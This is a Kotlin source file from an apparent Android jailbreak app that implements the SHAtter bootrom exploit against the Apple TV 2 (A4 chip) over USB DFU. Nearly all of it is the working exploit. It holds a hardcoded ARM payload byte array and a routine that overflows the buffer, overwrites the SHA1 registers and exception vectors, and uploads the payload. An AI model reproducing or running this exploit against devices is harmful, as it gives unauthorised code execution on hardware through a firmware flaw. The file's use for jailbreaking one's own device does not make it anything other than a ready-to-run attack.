package tv.blackb0x.droid

import android.hardware.usb.UsbDevice
import android.hardware.usb.UsbDeviceConnection
import android.hardware.usb.UsbManager

/**
 * SHAtter for AppleTV2,1 (A4 / CPID 0x8930). Port of DeviceManager::SHAtter.
 * Large getData stages used to hang on Android if USB stalled — transfers
 * are now checked and timed so 25% cannot freeze the UI forever.
 */
object Shatter {
    private val PAYLOAD = byteArrayOf(
        0x33.toByte(), 0x67.toByte(), 0x6d.toByte(), 0x49.toByte(), 0x58.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x44.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(),
        0x2c.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x73.toByte(), 0x73.toByte(), 0x62.toByte(), 0x69.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(),
        0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(),
        0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(),
        0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(), 0xf0.toByte(),
        0x99.toByte(), 0xf1.toByte(), 0x02.toByte(), 0x84.toByte(), 0x48.toByte(), 0x53.toByte(), 0x48.toByte(), 0x53.toByte(), 0x0c.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(),
        0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x54.toByte(), 0x52.toByte(), 0x45.toByte(), 0x43.toByte(), 0x0c.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(),
        0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x00.toByte(), 0x20.toByte(), 0x4f.toByte(), 0xf0.toByte(), 0x3f.toByte(), 0x41.toByte(), 0x80.toByte(), 0x22.toByte(),
        0x48.toByte(), 0xf2.toByte(), 0xdc.toByte(), 0x43.toByte(), 0x98.toByte(), 0x47.toByte(), 0x52.toByte(), 0x48.toByte(), 0x52.toByte(), 0x49.toByte(), 0x4f.toByte(), 0xf4.toByte(),
        0xa0.toByte(), 0x72.toByte(), 0x48.toByte(), 0xf2.toByte(), 0xdc.toByte(), 0x43.toByte(), 0x98.toByte(), 0x47.toByte(), 0x47.toByte(), 0xf2.toByte(), 0x2d.toByte(), 0x13.toByte(),
        0x98.toByte(), 0x47.toByte(), 0x4f.toByte(), 0xf4.toByte(), 0xc9.toByte(), 0x43.toByte(), 0x98.toByte(), 0x47.toByte(), 0x79.toByte(), 0x46.toByte(), 0x04.toByte(), 0x39.toByte(),
        0x4c.toByte(), 0x48.toByte(), 0x88.toByte(), 0x42.toByte(), 0x07.toByte(), 0xd0.toByte(), 0x4f.toByte(), 0xf4.toByte(), 0x80.toByte(), 0x62.toByte(), 0x48.toByte(), 0xf2.toByte(),
        0xdc.toByte(), 0x43.toByte(), 0x98.toByte(), 0x47.toByte(), 0x48.toByte(), 0x4b.toByte(), 0x01.toByte(), 0x33.toByte(), 0x18.toByte(), 0x47.toByte(), 0x48.toByte(), 0x48.toByte(),
        0x0c.toByte(), 0x38.toByte(), 0x85.toByte(), 0x46.toByte(), 0x01.toByte(), 0x20.toByte(), 0x01.toByte(), 0x21.toByte(), 0x00.toByte(), 0x22.toByte(), 0x44.toByte(), 0xf6.toByte(),
        0x8d.toByte(), 0x63.toByte(), 0x98.toByte(), 0x47.toByte(), 0x00.toByte(), 0x20.toByte(), 0x46.toByte(), 0xf6.toByte(), 0x0d.toByte(), 0x13.toByte(), 0x98.toByte(), 0x47.toByte(),
        0x42.toByte(), 0x48.toByte(), 0x3a.toByte(), 0xa1.toByte(), 0x78.toByte(), 0x22.toByte(), 0x49.toByte(), 0xf2.toByte(), 0xc9.toByte(), 0x03.toByte(), 0x98.toByte(), 0x47.toByte(),
        0x44.toByte(), 0xf6.toByte(), 0x85.toByte(), 0x43.toByte(), 0x4f.toByte(), 0xf0.toByte(), 0x04.toByte(), 0x40.toByte(), 0x4f.toByte(), 0xf4.toByte(), 0x30.toByte(), 0x31.toByte(),
        0x98.toByte(), 0x47.toByte(), 0x04.toByte(), 0x1c.toByte(), 0x3c.toByte(), 0x49.toByte(), 0x08.toByte(), 0x68.toByte(), 0x00.toByte(), 0x22.toByte(), 0x0a.toByte(), 0x60.toByte(),
        0x43.toByte(), 0xf6.toByte(), 0x95.toByte(), 0x33.toByte(), 0x98.toByte(), 0x47.toByte(), 0x00.toByte(), 0x2c.toByte(), 0xee.toByte(), 0xdb.toByte(), 0x4f.toByte(), 0xf0.toByte(),
        0x04.toByte(), 0x45.toByte(), 0x28.toByte(), 0x68.toByte(), 0x37.toByte(), 0x49.toByte(), 0x88.toByte(), 0x42.toByte(), 0x0f.toByte(), 0xd1.toByte(), 0xa8.toByte(), 0x68.toByte(),
        0xe9.toByte(), 0x68.toByte(), 0x2a.toByte(), 0x69.toByte(), 0x6b.toByte(), 0x69.toByte(), 0xac.toByte(), 0x69.toByte(), 0x00.toByte(), 0x94.toByte(), 0xec.toByte(), 0x69.toByte(),
        0x01.toByte(), 0x94.toByte(), 0x2c.toByte(), 0x6a.toByte(), 0x02.toByte(), 0x94.toByte(), 0x6c.toByte(), 0x68.toByte(), 0xa0.toByte(), 0x47.toByte(), 0x68.toByte(), 0x60.toByte(),
        0x00.toByte(), 0x21.toByte(), 0x29.toByte(), 0x60.toByte(), 0xd8.toByte(), 0xe7.toByte(), 0x4f.toByte(), 0xf0.toByte(), 0x04.toByte(), 0x40.toByte(), 0x21.toByte(), 0x1c.toByte(),
        0x00.toByte(), 0x22.toByte(), 0x47.toByte(), 0xf2.toByte(), 0x69.toByte(), 0x43.toByte(), 0x98.toByte(), 0x47.toByte(), 0x00.toByte(), 0x28.toByte(), 0xcf.toByte(), 0xd0.toByte(),
        0x4f.toByte(), 0xf0.toByte(), 0x04.toByte(), 0x43.toByte(), 0x00.toByte(), 0x93.toByte(), 0x01.toByte(), 0x94.toByte(), 0x04.toByte(), 0x1c.toByte(), 0x69.toByte(), 0x46.toByte(),
        0x01.toByte(), 0xaa.toByte(), 0x00.toByte(), 0xf0.toByte(), 0x0c.toByte(), 0xf8.toByte(), 0x28.toByte(), 0xb9.toByte(), 0x4f.toByte(), 0xf0.toByte(), 0x04.toByte(), 0x41.toByte(),
        0x00.toByte(), 0x22.toByte(), 0x45.toByte(), 0xf6.toByte(), 0x5d.toByte(), 0x23.toByte(), 0x98.toByte(), 0x47.toByte(), 0x20.toByte(), 0x1c.toByte(), 0x47.toByte(), 0xf2.toByte(),
        0x51.toByte(), 0x43.toByte(), 0x98.toByte(), 0x47.toByte(), 0xba.toByte(), 0xe7.toByte(), 0xf0.toByte(), 0xb5.toByte(), 0x5e.toByte(), 0x46.toByte(), 0x55.toByte(), 0x46.toByte(),
        0x44.toByte(), 0x46.toByte(), 0x70.toByte(), 0xb4.toByte(), 0x06.toByte(), 0xaf.toByte(), 0x4f.toByte(), 0xf0.toByte(), 0x68.toByte(), 0x04.toByte(), 0x6d.toByte(), 0x46.toByte(),
        0x2d.toByte(), 0x1b.toByte(), 0xad.toByte(), 0x46.toByte(), 0x00.toByte(), 0x23.toByte(), 0x4f.toByte(), 0xf0.toByte(), 0x64.toByte(), 0x04.toByte(), 0x2c.toByte(), 0x19.toByte(),
        0x23.toByte(), 0x60.toByte(), 0x04.toByte(), 0x92.toByte(), 0x05.toByte(), 0x91.toByte(), 0x06.toByte(), 0x93.toByte(), 0x0e.toByte(), 0x68.toByte(), 0x8a.toByte(), 0x46.toByte(),
        0x9b.toByte(), 0x46.toByte(), 0x4f.toByte(), 0xf4.toByte(), 0x30.toByte(), 0x31.toByte(), 0x88.toByte(), 0x46.toByte(), 0x42.toByte(), 0x68.toByte(), 0x8a.toByte(), 0x42.toByte(),
        0x09.toByte(), 0xdc.toByte(), 0x90.toByte(), 0x46.toByte(), 0x20.toByte(), 0x1c.toByte(), 0x31.toByte(), 0x1c.toByte(), 0x44.toByte(), 0xf2.toByte(), 0x2d.toByte(), 0x14.toByte(),
        0xa0.toByte(), 0x47.toByte(), 0x04.toByte(), 0x1c.toByte(), 0x44.toByte(), 0xf2.toByte(), 0xdb.toByte(), 0x63.toByte(), 0x14.toByte(), 0xb1.toByte(), 0x01.toByte(), 0x24.toByte(),
        0x44.toByte(), 0xf2.toByte(), 0xdb.toByte(), 0x73.toByte(), 0x18.toByte(), 0x47.toByte(), 0xc0.toByte(), 0x46.toByte(), 0x20.toByte(), 0x50.toByte(), 0x57.toByte(), 0x4e.toByte(),
        0x44.toByte(), 0x3a.toByte(), 0x5b.toByte(), 0x53.toByte(), 0x48.toByte(), 0x41.toByte(), 0x74.toByte(), 0x74.toByte(), 0x65.toByte(), 0x72.toByte(), 0x5d.toByte(), 0x00.toByte(),
        0x00.toByte(), 0xc0.toByte(), 0x02.toByte(), 0x84.toByte(), 0x00.toByte(), 0xc0.toByte(), 0x00.toByte(), 0xbf.toByte(), 0x00.toByte(), 0x98.toByte(), 0x03.toByte(), 0x84.toByte(),
        0x00.toByte(), 0xc0.toByte(), 0x03.toByte(), 0x84.toByte(), 0xe0.toByte(), 0xe0.toByte(), 0x02.toByte(), 0x84.toByte(), 0xcc.toByte(), 0xdb.toByte(), 0x02.toByte(), 0x84.toByte(),
        0x63.toByte(), 0x65.toByte(), 0x78.toByte(), 0x65.toByte()
    )

    fun run(
        usb: UsbManager,
        open: () -> Pair<UsbDevice, UsbDeviceConnection>?,
        log: (String) -> Unit,
        progress: (Double) -> Unit,
    ): Boolean {
        fun reopen(): UsbDeviceConnection? {
            val pair = open() ?: return null
            AppleUsb.claim(pair.second, pair.first)
            return pair.second
        }

        log("Preparing buffer overflow")
        progress(5.0)
        var c = reopen() ?: return fail(log, "open failed")
        resetCounters(c)
        // small read — errors here are fatal
        if (!getData(c, 0x40, log, allowStall = false)) {
            c.close()
            return fail(log, "getData 0x40")
        }
        progress(15.0)
        c.close()

        log("Requesting validation")
        c = reopen() ?: return fail(log, "open after reset")
        requestImageValidation(c)
        c.close()

        // 0x2C000 is ~176 packets — this is the stage that looked "stuck at 25%"
        log("Filling buffer (this can take ~30–90s on OTG)")
        progress(25.0)
        c = reopen() ?: return fail(log, "open fill")
        // stalls/errors during the big fill are common mid-SHAtter; keep going
        getData(c, 0x2C000, log, allowStall = true) { done, total ->
            val pct = 25.0 + (done.toDouble() / total) * 10.0
            progress(pct)
        }
        progress(35.0)
        try { c.close() } catch (_: Exception) {}

        Thread.sleep(800)

        log("Overwriting SHA1 registers")
        progress(40.0)
        c = reopen() ?: return fail(log, "open sha1 — re-enter DFU and retry")
        resetCounters(c)
        getData(c, 0x140, log, allowStall = true)
        try { c.close() } catch (_: Exception) {}

        c = reopen() ?: return fail(log, "open validate2")
        progress(55.0)
        requestImageValidation(c)
        try { c.close() } catch (_: Exception) {}

        log("Sending SHAtter payload")
        c = reopen() ?: return fail(log, "open payload")
        progress(65.0)
        if (!sendBuffer(c, PAYLOAD, log)) {
            try { c.close() } catch (_: Exception) {}
            return false
        }
        progress(85.0)
        log("Overwriting exception vectors")
        getData(c, 0x2C000, log, allowStall = true)
        progress(95.0)
        try { c.close() } catch (_: Exception) {}

        Thread.sleep(800)
        progress(100.0)
        log("SHAtter successful")
        return true
    }

    private fun fail(log: (String) -> Unit, msg: String): Boolean {
        log("SHAtter failed: $msg")
        return false
    }

    private fun resetCounters(c: UsbDeviceConnection) {
        c.controlTransfer(0x21, 4, 0, 0, null, 0, 500)
    }

    /**
     * @param allowStall when true, a failed/short transfer ends the loop early
     *   instead of spinning on 5s timeouts (the old hang-at-25% bug).
     */
    private fun getData(
        c: UsbDeviceConnection,
        length: Int,
        log: (String) -> Unit,
        allowStall: Boolean,
        onProgress: ((Int, Int) -> Unit)? = null,
    ): Boolean {
        val packet = 0x800
        val buf = ByteArray(packet)
        var left = length
        var done = 0
        var packets = 0
        while (left > 0) {
            val n = minOf(packet, left)
            // 800ms — never sit on a dead pipe for 5s × 176 packets
            val r = c.controlTransfer(0xA1, 2, 0, 0, buf, n, 800)
            if (r < 0) {
                if (allowStall) {
                    log("getData stall after $done/$length (ok for this stage)")
                    return true
                }
                log("getData failed r=$r at $done/$length")
                return false
            }
            if (r == 0 && allowStall) {
                log("getData empty after $done/$length")
                return true
            }
            left -= n
            done += n
            packets++
            if (packets % 16 == 0) {
                onProgress?.invoke(done, length)
            }
        }
        return true
    }

    private fun requestImageValidation(c: UsbDeviceConnection) {
        c.controlTransfer(0x21, 1, 0, 0, null, 0, 500)
        val blank = ByteArray(16)
        c.controlTransfer(0xA1, 3, 0, 0, blank, 6, 500)
        c.controlTransfer(0xA1, 3, 0, 0, blank, 6, 500)
        c.controlTransfer(0xA1, 3, 0, 0, blank, 6, 500)
    }

    private fun sendBuffer(c: UsbDeviceConnection, data: ByteArray, log: (String) -> Unit): Boolean {
        val packet = 0x800
        var sent = 0
        var block = 0
        while (sent < data.size) {
            val n = minOf(packet, data.size - sent)
            val chunk = data.copyOfRange(sent, sent + n)
            val r = c.controlTransfer(0x21, 1, block, 0, chunk, n, 2000)
            if (r != n) {
                log("payload send block $block r=$r")
                return false
            }
            val status = ByteArray(6)
            c.controlTransfer(0xA1, 3, 0, 0, status, 6, 500)
            sent += n
            block++
        }
        c.controlTransfer(0x21, 1, block, 0, ByteArray(0), 0, 500)
        val status = ByteArray(6)
        c.controlTransfer(0xA1, 3, 0, 0, status, 6, 500)
        c.controlTransfer(0xA1, 3, 0, 0, status, 6, 500)
        return true
    }
}
